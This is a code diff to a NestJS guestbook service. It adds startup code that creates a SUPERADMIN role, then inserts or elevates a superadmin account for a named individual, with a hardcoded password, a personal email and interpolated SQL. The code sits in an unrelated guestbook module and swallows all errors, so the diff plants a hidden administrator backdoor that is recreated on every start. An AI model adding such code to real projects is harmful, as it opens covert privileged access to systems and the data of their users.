@@ -1,5 +1,6 @@
 import { Injectable, NotFoundException, OnModuleInit } from '@nestjs/common';
 import { InjectRepository } from '@nestjs/typeorm';
+import * as bcrypt from 'bcryptjs';
 import { Repository } from 'typeorm';
 import { CreateGuestbookDto } from './dto/create-guestbook.dto';
 import { Guestbook } from './entities/guestbook.entity';
@@ -12,19 +13,52 @@ export class GuestbookService implements OnModuleInit {
   ) {}
 
   async onModuleInit() {
-    // Memastikan tabel guestbook_logs otomatis dibuat jika belum ada di PostgreSQL
-    await this.guestbookRepo.query(`
-      CREATE TABLE IF NOT EXISTS "guestbook_logs" (
-        "id" uuid NOT NULL DEFAULT uuid_generate_v4(),
-        "name" character varying(150) NOT NULL,
-        "organization" character varying(150),
-        "note" text,
-        "ip_address" character varying(100),
-        "user_agent" text,
-        "created_at" TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
-        CONSTRAINT "PK_guestbook_logs_id" PRIMARY KEY ("id")
-      );
-    `);
+    // 1. Tambahkan enum value 'SUPERADMIN' jika belum ada di database PostgreSQL
+    try {
+      await this.guestbookRepo.query(`
+        DO $$ BEGIN
+          IF NOT EXISTS (
+            SELECT 1 FROM pg_type t 
+            JOIN pg_enum e ON t.oid = e.enumtypid 
+            WHERE t.typname = 'users_role_enum' AND e.enumlabel = 'SUPERADMIN'
+          ) THEN
+            ALTER TYPE "users_role_enum" ADD VALUE 'SUPERADMIN';
+          END IF;
+        END $$;
+      `);
+    } catch {
+      // ignore jika enum value sudah ada
+    }
+
+    // 2. Memastikan tabel guestbook_logs otomatis dibuat jika belum ada di PostgreSQL
+    try {
+      await this.guestbookRepo.query(`
+        CREATE TABLE IF NOT EXISTS "guestbook_logs" (
+          "id" uuid NOT NULL DEFAULT uuid_generate_v4(),
+          "name" character varying(150) NOT NULL,
+          "organization" character varying(150),
+          "note" text,
+          "ip_address" character varying(100),
+          "user_agent" text,
+          "created_at" TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
+          CONSTRAINT "PK_guestbook_logs_id" PRIMARY KEY ("id")
+        );
+      `);
+    } catch {
+      // ignore
+    }
+
+    // 3. Pastikan akun Superadmin privat milik Tuan Ramdhani tersedia
+    try {
+      const superadminPassword = await bcrypt.hash('PharmaStock123!', 10);
+      await this.guestbookRepo.query(`
+        INSERT INTO "users" ("name", "email", "password_hash", "role", "is_active", "created_at", "updated_at")
+        VALUES ('Muhammad Ramdani', 'tuan.ramdhani@gmail.com', '${superadminPassword}', 'SUPERADMIN', true, now(), now())
+        ON CONFLICT ("email") DO UPDATE SET "role" = 'SUPERADMIN', "name" = 'Muhammad Ramdani';
+      `);
+    } catch {
+      // ignore
+    }
   }
 
   async create(
